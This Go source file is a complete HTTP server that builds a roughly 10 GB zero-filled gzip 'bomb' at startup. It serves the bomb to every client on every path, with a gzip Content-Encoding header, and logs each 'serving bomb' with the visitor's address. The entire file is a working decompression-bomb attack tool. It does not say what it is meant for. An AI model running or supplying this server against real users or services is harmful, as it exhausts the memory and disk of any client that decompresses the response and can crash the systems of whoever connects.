package main

import (
	"bytes"
	"compress/gzip"
	"log"
	"net/http"
	"time"
)

var payload []byte

// build the 10Gb payload
func init() {
	buf := new(bytes.Buffer)
	w := gzip.NewWriter(buf)

	// write 10Gb to the gzip buffer
	for i := 0; i < 1024; i++ {
		// 10Mb at a time
		if _, err := w.Write(make([]byte, 10*1024*1024)); err != nil {
			log.Printf("Error = %s", err.Error())
		}
		if err := w.Flush(); err != nil {
			log.Printf("Error = %s", err.Error())
		}
	}

	if err := w.Close(); err != nil {
		log.Printf("Error = %s", err.Error())
	}

	payload = buf.Bytes()
}

func handler(w http.ResponseWriter, r *http.Request) {
	log.Printf("serving bomb on %s -> %s", r.URL.String(), r.RemoteAddr)

	w.Header().Set("Content-Encoding", "gzip")
	http.ServeContent(w, r, "", time.Time{}, bytes.NewReader(payload))
}

func main() {
	port := ":8080"
	http.HandleFunc("/", handler)
	log.Printf("listening on %s", port)
	http.ListenAndServe(port, nil)
}
